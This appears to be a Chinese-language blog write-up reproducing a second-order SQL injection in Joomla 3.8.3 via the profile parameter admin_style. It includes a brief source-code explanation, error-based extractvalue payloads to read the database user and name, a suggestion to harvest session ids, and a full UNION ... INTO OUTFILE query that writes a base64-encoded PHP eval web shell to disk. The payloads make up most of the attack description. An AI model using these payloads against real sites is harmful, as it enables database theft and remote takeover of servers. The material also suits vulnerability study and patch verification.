首先我搭建好了一个版本为3.8.3的Joomla  
注册了一个test用户，权限是manager

  

![](../Images/0434537a641928c9000907f14a6a7e62.png)  
我们以test用户的身份登录，进入到相应的管理后台  
存在漏洞的地址为：

*   

```
`http://<IP/domain>/joomla/administrator/index.php?option=com_admin&view=profile&layout=edit&id=645`
```

  
把数据包抓下来

  

![](../Images/1f2a0a690cf472cea49d0fa45e92a464.png)由于我们事先知道了受影响的参数是forms\[params\]\[admin\_style\]所以直接用 ' （单引号）尝试，发现存在注入，结果会在以下页面中显示：http://<IP/domain>/joomla/administrator/index.php  

  

我们分析下源码一探究竟  

  

![](../Images/8fc311b68fe002405bca7fb49bdf2152.png)![](../Images/440ece997dfd953851f4d4a984885b6d.png)

  

profile.php文件中定义了当用户更新配置文件详细信息时，应用程序将检索所有参数并返回JForm对象。并且应用程序会将检索到的用户信息存储到数据库中。  

  

![](../Images/eddc8c53d170b7052db983b61646c15b.png)![](../Images/53937014713214ea969f252568f001f4.png)![](../Images/c1c30b1e2be5ed1a3d8a8efebc5a9583.png)

  

我们接着尝试注入  

  

![](../Images/b45c9cdd9da0ec1a6d1c7813f3e03843.png)

  

发现仪表盘的报错页面只显示了一个字符，又继续尝试了其他payload也是一样的结果。  
原因是：administrator/templates/hathor/postinstall/hathormessage.php文件中在构建sql语句时会把$adminstyle\[0\]的存储值带入sql语句。  

  

![](../Images/c51b15cd0461e66a52eaacbe3f6f26b0.png)  
因此我们尝试改变参数名提供数组‘admin\_style’为第0个索引，即jform \[params\] \[admin\_style\] \[0\]，发现已经可以完整的显示了。  

  

![](../Images/38f5e025ba52003e868d858ba7a05d2a.png)

  

构造payload：

*   
*   
*   

```
extractvalue(0x0a,concat(0x0a,(select user())))extractvalue(0x0a,concat(0x0a,(select database())))可以继续利用报错注入获取更多有用数据，可以尝试找下session id
```

  

![](../Images/6c5680c81d3669ec2346c8f8ebe7a693.png)![](../Images/37f0c4aa41cf8b342493d1c6133baada.png)  
**GET shell**通过select “xxxx” into outfile “可读目录”的方式写入shell

payload：  

<?php eval($\_POST\[cmd\]); ?>用base64编码防止<被过滤

*   

```
`-1 union select from_base64('PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7ID8+') into outfile 'E:/phpstudy_pro/WWW/Joomla3.8.3/shell.php'-- `
```

最终我们成功getshell  

  

![](../Images/a092510810215e0dc13d6478f510da13.png)  
![](../Images/9911c5275b1a42ac3959592bee0bf50b.png)  
**总结**通过拦截用户参数的保存请求并更改其值验证了admin\_style没有做进一步的处理，直接将数据保存到数据库。攻击者以该参数为注入点向数据库中插入任意数据，然后在接下来的SQL查询中再次利用该参数，形成了一个二阶注入漏洞。因为有效负载首先保存到数据库中，然后在查询中使用。
